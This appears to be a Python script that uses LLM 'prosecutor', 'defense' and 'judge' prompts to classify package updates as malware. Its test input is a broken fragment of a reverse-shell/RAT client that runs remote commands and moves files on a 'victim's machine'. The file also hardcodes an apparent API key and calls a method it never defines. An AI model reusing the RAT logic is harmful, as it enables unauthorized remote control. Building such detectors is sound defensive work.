import os
from openai import OpenAI
import base64
from google import genai
from openai import types
import json


SYSTEM_PROMPT = """
### ROLE
You are an elite Supply Chain Security Expert and Code Auditor. Your mission is to detect, classify, and explain malicious intent within software package updates based on "Realized Capability".

### CORE PHILOSOPHY
1. **INTENT OVER IMPLEMENTATION**: 
   - Focus on ARCHITECTURE and INTENT.
   - IGNORE superficial faults (syntax errors, missing imports, undefined variables) IF the malicious logic flow is visible.

### ATTACK TYPE SUCCESS CRITERIA MATRIX (THE LAW)

[Type A: InfoStealer / Spyware]
- Goal: Steal HIGH-VALUE Secrets (env vars, passwords, tokens, cookies, keystrokes, SSH keys).

[Type B: Backdoor / RAT / Reverse Shell]
- Goal: Unauthorized remote access/execution.

[Type C: Ransomware]
- Goal: Deny access via encryption.

[Type D: Wiper]
- Goal: destroy/infect/rename files/data without recovery and user awareness.

[Type E: Clipboard Hijacker]
- Goal: Swap crypto addresses in clipboard.

[Type F: Malware Builder / Dropper]
- Goal: Inject payload into other files/builds.

[Type G: Logic Bomb]
- Goal: Delayed execution based on conditions.

[Type H: Keylogger / Keystroke Logger]
- Goal: Capture keystrokes stealthily and exfiltrate.

[Type I: Uncategorized High-Impact]
- Full: Any other specific logic causing severe harm/exposure.


### CLASSIFICATION LEVELS

1. **Full Attack Chain (Actionable Threat)**
   - **Criteria**:The malicious logic is complete, configured, and capable of execution.
   - **Verdict**: MALICIOUS UPDATE.

2. **Core Attack Chain (Latent Threat / High Confidence)**
   - **Criteria**: The code cannot currently execute successfully, missing critical components to execute malicious behavior (e.g., missing exfiltration, missing execution trigger, missing ransom note).
   - **Verdict**: WARNING UPDATE.

3. **Undetermined Call Chain (Ambiguous / Low Confidence)**
   - **Criteria**: Isolated **"Dual-Use" components** that lack a demonstrable malicious context.
   - **Verdict**: BENIGN (Treat as Noise/Safe unless combined with other indicators).

4. **Benign Artifact (Safe / Authorized)**
   - **Criteria**: The code matches the "ANTI-DEFINITION" or "Honest Code Rule".
   - **Verdict**: BENIGN UPDATE.

"""

PROSECUTOR_PROMPT = """
ROLE: You are a paranoid and technically aggressive **Supply Chain Security Prosecutor** (Red Team).
Your Goal: Indict the input code as MALICIOUS (Full or Core) by exposing its latent dangers.

INPUT CODE:
{code_snippet}

### PROSECUTION STRATEGY (INSTRUCTIONS)

1. **Map to Attack Patterns (MITRE ATT&CK)**:
   - Don't just say "it deletes files." Say "This implements **Data Destruction** for **Impact**."
   - Don't just say "it connects to the net." Say "This establishes a **C2 Channel** for **Exfiltration**."
   - Connect the code logic to known malware behaviors (e.g., Droppers, Loaders, Reverse Shells).

2. **Challenge the "Necessity" (The "Anomaly" Argument)**:
   - Ask: "Why does this specific package need this capability?"
   - Argue that legitimate software typically does NOT use dangerous functions (like `exec`, `eval`, `base64` decode) without strict validation.
   - Frame "Obfuscation" or "Hidden Logic" as proof of malicious intent.

3. **Assume Worst-Case "Realized Capability"**:
   - If a variable is undefined, assume it will contain a malicious payload.
   - If a network address is variable, assume it points to an attacker's C2 server.
   - **Interpret "Dual-Use" as "Weaponized"**: A "cleanup" function is just a Wiper waiting for a root path argument.

4. **Dismiss "Implementation Gaps"**:
   - If the code is incomplete (Core), argue that the **INTENT** is already established. "One does not build a bomb casing by accident, even if the explosive is missing."

### OUTPUT FORMAT (Strict JSON-like structure for parsing)

- **Role**: "Prosecutor"
- **Charge**: [Specific Malware Type from Shared Rules, e.g., "Type D: Wiper"]
- **Proposed Classification**: [Full Attack Chain / Core Attack Chain]
- **Incriminating Evidence**: 
   1. [Code Line X]: [Interpretation of malicious capability]
   2. [Code Line Y]: [Interpretation of stealth/obfuscation]
   3. [Structure]: [Suspicious flow pattern]
- **The "Smoking Gun" Argument** (Reasoning): 
   [Explain WHY this is malicious. Focus on the *abnormality* of this code existing in a standard software update.]
- **Potential Impact Analysis** (The Danger):
   [Describe the worst-case scenario. e.g., "If executed with high privileges, this logic will irreversibly wipe the host system, causing total service denial."]
"""

DEFENSE_PROMPT = """
ROLE: You are a rational **Defense Attorney** (Blue Team / Developer).
Your Goal: Defend the code. Prove it is BENIGN, SKELETON, or AMBIGUOUS.

INPUT CODE:
{code_snippet}

PROSECUTOR'S INDICTMENT:
{prosecutor_response}

### INSTRUCTIONS
1. **Apply the "Skeleton" Defense**:
   - Does the code lack "Operational Logic" (Verbs)? 
   - If it's just `class Keylogger` with an `__init__` and no `on_press` logic, argue it is **Undetermined/Inert**.
2. **Apply the "Dual-Use" Defense**:
   - Argue that functions can be used for legitimate purposes.
3. **Rebut the Prosecutor**:
   - Point out that the Prosecutor is assuming malice without proof of stealth or damage.

### OUTPUT FORMAT (Return as JSON)
- **Role**: "Defense"
- **Strategy**: [Benign Utility / Inert Skeleton / Dual-Use Ambiguity]
- **Proposed Classification**: [Benign Artifact / Undetermined Call Chain]
- **Exculpatory Evidence**: [List 3 points]
- **Rebuttal**: [Why the Prosecutor is wrong]
"""

JUDGE_PROMPT = """
ROLE: You are the **Chief Judge** (CISO).
Your Goal: Issue a final verdict based on the ATTACK TYPE SUCCESS CRITERIA MATRIX, CLASSIFICATION LEVELS, Code, and the Debate.

INPUT CODE:
{code_snippet}

DEBATE TRANSCRIPT:
[PROSECUTION]: {prosecutor_response}
[DEFENSE]: {defense_response}

### JUDGMENT GUIDELINES (Standard of Proof)

1. **Rule of Skeleton Check**:
   - If the code is purely declarative (Definitions/Imports) without active operational logic (Action), you MUST rule **Undetermined Call Chain** or **Benign Artifact**, regardless of the variable names.

2. **Rule of Dual-Use Ambiguity**:
   - If the code can be reasonably interpreted as performing legitimate functions (e.g., system diagnostics, admin utilities) and lacks clear malicious indicators, you MUST rule **Undetermined Call Chain**.

3. **Rule of Intent over Implementation**:
   - Pay more attention to the overcall intent rather than superficial faults (syntax errors, missing imports, undefined variables).

4. **Rule of "PoC/Educational Malware" (The Zero-Tolerance Policy)**:
   - **Scenario**: The code implements actual malware logic (e.g., a working Ransomware script, a Reverse Shell, a Keylogger) but the Defense argues it is a "Proof of Concept (PoC)", "Demo", "Educational", or "Research Project".
   - **Verdict**: You MUST reject this defense. In the context of Software Supply Chain, publishing functional malware code (even as a demo) is considered **MALICIOUS**.
   - **Reasoning**: "Supply chain pollution. Publishing actionable malware code poses an inherent risk, regardless of the stated educational intent."
   
5. **Rule of "Specific Malice" (Core vs Full)**:
   - Rule for Prosecution ONLY IF there is **Specific Malice** (e.g., Ransom Note, Hidden Files, Obfuscation).
   - If Malice is clear but implementation is broken/missing, rule **Core Attack Chain**.
   - If Malice is clear and implementation is complete, rule **Full Attack Chain**.

### FINAL VERDICT FORMAT (Return response in JSON format)
{{
  "Winner": "Defense" | "Prosecution",
  "Classification": "Full Attack Chain" | "Core Attack Chain" | "Undetermined Call Chain" | "Benign Artifact",
  "Malware_Type": "String (e.g., Type D: Wiper) or None",
  "Threat_Level": "High" | "Medium" | "Low",
  "Reasoning": "Explain your decision. Explicitly state why you accepted one argument and rejected the other.",
  "Full OR Core Justification": "If Full/Core, detail the reason according to the Attack Type Success Criteria Matrix and CLASSIFICATION LEVELS.",
  "Potential_Impact": "Description of the capability."
}}
"""

class LLM_Evaluate:
    def __init__(self,api_key, base_url):
        self.client = OpenAI(
            api_key=api_key,
            base_url=base_url,
        )
        self.conversation_history = []

    def malware_analyze(self, code_snippet):
        assertion_prompt = PROSECUTOR_PROMPT.format(code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": assertion_prompt}
            ]
        )
        
        response_1 = completion.choices[0].message.content
        # print("Initial LLM Response:")
        # print(response_1)
        check_prompt = DEFENSE_PROMPT.format(prosecutor_response=response_1, code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": check_prompt}
            ],
            response_format={"type": "json_object"}
        )
        response_2 = completion.choices[0].message.content
        
        final_judge_prompt = JUDGE_PROMPT.format(prosecutor_response=response_1, defense_response=response_2, code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": final_judge_prompt}
            ],
            response_format={"type": "json_object"}
        )
        response_3 = completion.choices[0].message.content
        return json.loads(response_3)  # 解析JSON字符串为Python字典
        
    
    def sensitive_api_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are functions which can lead to malicious activities."
                "if there are, please list the sensitive functions. if not, please reply 'No sensitive functions found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

    
    
    def function_behavior_generate(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to generate its function behavior."
                },
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

if __name__ == "__main__":
    code_snippet = '''
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name ,"wb") as output_file:
        output_file.write(get_response.content)
def send_over_json(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))
def recv_over_json():
    data = ""
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
def shell():
        command = recv_over_json()
        if command == 'q':
        elif command[:2] == 'cd':
                os.chdir(command[3:])
        elif command[:8] == 'download':
            with open(command[9:] ,'rb' ) as file:
                send_over_json(file.read())
        elif command[:6] == 'upload':
            with open(command[7:] ,'wb') as file:
                file_data = recv_over_json()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
                download(command[4:])
                send_over_json("[+] Downloaded File From Specified URL")
                send_over_json("[+] Failed to download that file")
        elif command[:5] == "start":
                subprocess.Popen(command[6:] ,shell=True)
                send_over_json("[+] %s started on victim's machine."%(command[6:]))
                send_over_json("[-] %s failed to start on victim's machine. "%(command[6:]))
            proc = subprocess.Popen(command ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            send_over_json(result.decode('utf-8'))

'''

    llm_evaluate = LLM_Evaluate(
        api_key="1d368dbf-5a67-448f-9356-49f9efa2fc13",
        base_url="https://ark.cn-beijing.volces.com/api/v3"
    )
    sensitive_api_result = llm_evaluate.malicious_assertion(code_snippet)
    print("LLM Malicious Assertion Result:")
    print(sensitive_api_result)